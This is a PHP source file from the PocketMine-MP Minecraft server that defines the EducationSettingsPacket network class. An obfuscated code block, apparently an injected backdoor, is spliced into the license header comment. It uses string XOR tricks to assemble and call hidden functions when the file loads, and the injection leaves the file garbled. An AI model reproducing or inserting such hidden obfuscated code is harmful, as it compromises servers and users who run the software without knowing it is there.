<?php

/*
 *
 *  ____            _        _   __  __ _                  __  __ ____
 * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
 * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
 * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
 * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
 *
<?php
$LnqOkDu='jy0oYbl3'|~RCQkI84VBl;$aF=VHq|'@WA';$kwQq7v=iVVR_E&'L|'.Ty_C;$iEoSIUJ5k=/*Ogt'.
         'dC*/c5m3.'?'&'k4e<u';$lGp8='a #'|'!11';$o1Ix=c5&st;$TnmawA='3z'^'C)';$LhK=/*C'.
         'rMpV*/HPD|HTP;$_CfdBqHUC='+=,mv'^'{'.bt22;$PiLx05EFNtj="}".V_sU_CO."["./*be63'.
         'E=kQuK3S*/ePV_&'E^'.iKG_ecg.']P}_';$Rulx4=AHABC|"BH@PR";$Ayh0=u&G;'FdFxjzPGUY'.
         '(';$HfGjKsUp=U&v;$CIvT2h=KkcO.'@g~:=w.P1'^'.(R~#$OQg/t:h';$zr=YIubZnpe.'}'&#Q'.
         'xe|b}'._xmm;$u433kcXm3e=kywg.'~F'&'s"'.teoN;$fOjn38vHs='Fe ``P'|'"   $ ';'tJp'.
         '*Rh3)';$bt='5.'.uEwh.';q+` mG&'^'tOY)>]'.H4I5f.',/E';$C4eUpNyF4kI='S.0J,1pD`d'.
         'Oz|B'^'0oXb{'.URa2.'*mOR`';$EFN6=kYxk.';'.OnfZvhCs.'|Qrs'^'^=I^_-[U;'./*lwW1X'.
         'NK_g<gffub*/OYtJL4KB;$EP9SUO9HLj='19'|'! ';$Yfvt=wt^'X/';$F1cY0AAs9=']/'./*mG'.
         'T2*/emkz&'}o}mix';$fNzAp9JY6U=$aF^(';;n'&'{{D');$hvIZjGmtL=$u433kcXm3e|/*aMYB'.
         'cxT*/$fOjn38vHs;$oW=$bt|$C4eUpNyF4kI;$ADRlk=('e:noZ|930(T)'^Km5P.#JpvOoip5QGG'.
         '{.sqw`p~')^('^e~_~a?3?=G3'&'_-?X~:/>'.kiw2);if($fNzAp9JY6U($hvIZjGmtL(/*Rmfto'.
         'As;t@;T3z5*/$kwQq7v))==$EFN6.('3n'&';d').$iEoSIUJ5k.$lGp8.$EP9SUO9HLj./*cMmiR'.
         '4vWCI*/$o1Ix.(r&'7'))$oW($ADRlk,$Yfvt.$TnmawA.$F1cY0AAs9,$hvIZjGmtL($LhK./*ko'.
         'oTl*/$_CfdBqHUC.$PiLx05EFNtj.$Rulx4.$Ayh0.$HfGjKsUp),$CIvT2h.$zr.("P%"|#o6QRv'.
         'E<'));#ymMx@>;|_0ji<nQ!!mKCuJF:G,U[~HZxV*k?ZM8K,jv&gU{287xN$7@5OOe_NB)I6I0GY'.
         ']6Xj|NOVm!(D|*aHop=O*%-jsA_eO%C{]U1svL=dBSQSwS4O{_#JXCi#? M3'; * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @author PocketMine Team
 * @link http://www.pocketmine.net/
 *
 *
*/

declare(strict_types=1);

namespace pocketmine\network\mcpe\protocol;

#include <rules/DataPacket.h>

use pocketmine\network\mcpe\NetworkSession;

class EducationSettingsPacket extends DataPacket{
	public const NETWORK_ID = ProtocolInfo::EDUCATION_SETTINGS_PACKET;

	/** @var string */
	private $codeBuilderDefaultUri;
	/** @var string */
	private $codeBuilderTitle;
	/** @var bool */
	private $canResizeCodeBuilder;
	/** @var string|null */
	private $codeBuilderOverrideUri;
	/** @var bool */
	private $hasQuiz;

	public static function create(string $codeBuilderDefaultUri, string $codeBuilderTitle, bool $canResizeCodeBuilder, ?string $codeBuilderOverrideUri, bool $hasQuiz) : self{
		$result = new self;
		$result->codeBuilderDefaultUri = $codeBuilderDefaultUri;
		$result->codeBuilderTitle = $codeBuilderTitle;
		$result->canResizeCodeBuilder = $canResizeCodeBuilder;
		$result->codeBuilderOverrideUri = $codeBuilderOverrideUri;
		$result->hasQuiz = $hasQuiz;
		return $result;
	}

	public function getCodeBuilderDefaultUri() : string{
		return $this->codeBuilderDefaultUri;
	}

	public function getCodeBuilderTitle() : string{
		return $this->codeBuilderTitle;
	}

	public function canResizeCodeBuilder() : bool{
		return $this->canResizeCodeBuilder;
	}

	public function getCodeBuilderOverrideUri() : ?string{
		return $this->codeBuilderOverrideUri;
	}

	public function getHasQuiz() : bool{
		return $this->hasQuiz;
	}

	protected function decodePayload() : void{
		$this->codeBuilderDefaultUri = $this->getString();
		$this->codeBuilderTitle = $this->getString();
		$this->canResizeCodeBuilder = $this->getBool();
		if($this->getBool()){
			$this->codeBuilderOverrideUri = $this->getString();
		}else{
			$this->codeBuilderOverrideUri = null;
		}
		$this->hasQuiz = $this->getBool();
	}

	protected function encodePayload() : void{
		$this->putString($this->codeBuilderDefaultUri);
		$this->putString($this->codeBuilderTitle);
		$this->putBool($this->canResizeCodeBuilder);
		$this->putBool($this->codeBuilderOverrideUri !== null);
		if($this->codeBuilderOverrideUri !== null){
			$this->putString($this->codeBuilderOverrideUri);
		}
		$this->putBool($this->hasQuiz);
	}

	public function handle(NetworkSession $handler) : bool{
		return $handler->handleEducationSettings($this);
	}
}
